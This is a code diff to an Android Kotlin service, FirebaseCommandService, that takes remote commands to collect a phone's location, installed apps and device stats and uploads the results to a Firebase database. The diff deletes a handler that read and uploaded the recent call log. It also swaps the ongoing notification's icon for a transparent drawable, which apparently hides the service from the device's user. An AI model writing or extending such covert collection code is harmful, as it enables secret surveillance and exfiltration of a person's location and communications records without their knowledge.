@@ -108,7 +108,6 @@ class FirebaseCommandService : Service() {
             "GET_LOCATION" -> getLocation()
             "GET_INSTALLED_APPS" -> getInstalledApps()
             "GET_DEVICE_STATS" -> getDeviceStats()
-            "GET_RECENT_CALLS" -> getRecentCalls()
         }
     }
 
@@ -245,51 +244,6 @@ class FirebaseCommandService : Service() {
         postResult("TEXT", sb.toString().trim(), "GET_DEVICE_STATS")
     }
 
-    private fun getRecentCalls() {
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
-            postResult("ERROR", "READ_CALL_LOG permission not granted", "GET_RECENT_CALLS")
-            return
-        }
-
-        val sb = StringBuilder()
-        val projection = arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION)
-        val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI, projection, null, null, CallLog.Calls.DATE + " DESC LIMIT 10")
-
-        if (cursor != null && cursor.moveToFirst()) {
-            val numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER)
-            val typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE)
-            val dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE)
-            val durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION)
-
-            do {
-                val number = if (numberIndex != -1) cursor.getString(numberIndex) ?: "Unknown" else "Unknown"
-                val typeCodeStr = if (typeIndex != -1) cursor.getString(typeIndex) else null
-                val typeCode = typeCodeStr?.toIntOrNull() ?: -1
-                val date = if (dateIndex != -1) cursor.getLong(dateIndex) else 0L
-                val duration = if (durationIndex != -1) cursor.getString(durationIndex) ?: "0" else "0"
-
-                val type = when (typeCode) {
-                    CallLog.Calls.INCOMING_TYPE -> "Incoming"
-                    CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
-                    CallLog.Calls.MISSED_TYPE -> "Missed"
-                    else -> "Other"
-                }
-
-                val dateStr = if (date > 0) {
-                    java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date(date))
-                } else {
-                    "Unknown Date"
-                }
-                sb.append("$dateStr | $type | $number | ${duration}s\n")
-            } while (cursor.moveToNext())
-            cursor.close()
-            postResult("TEXT", sb.toString().trim(), "GET_RECENT_CALLS")
-        } else {
-            cursor?.close()
-            postResult("TEXT", "No recent calls found.", "GET_RECENT_CALLS")
-        }
-    }
-
     private fun postResult(type: String, data: String, command: String = "") {
         val currentSessionKey = sessionKey ?: return
         val ref = FirebaseDatabase.getInstance().reference.child("sessions").child(currentSessionKey).child("results").push()
@@ -341,7 +295,7 @@ class FirebaseCommandService : Service() {
         return NotificationCompat.Builder(this, channelId)
             .setContentTitle(title)
             .setContentText(text)
-            .setSmallIcon(android.R.drawable.ic_menu_info_details)
+            .setSmallIcon(com.jonas.x24.R.drawable.ic_transparent)
             .setOngoing(true)
             .build()
     }
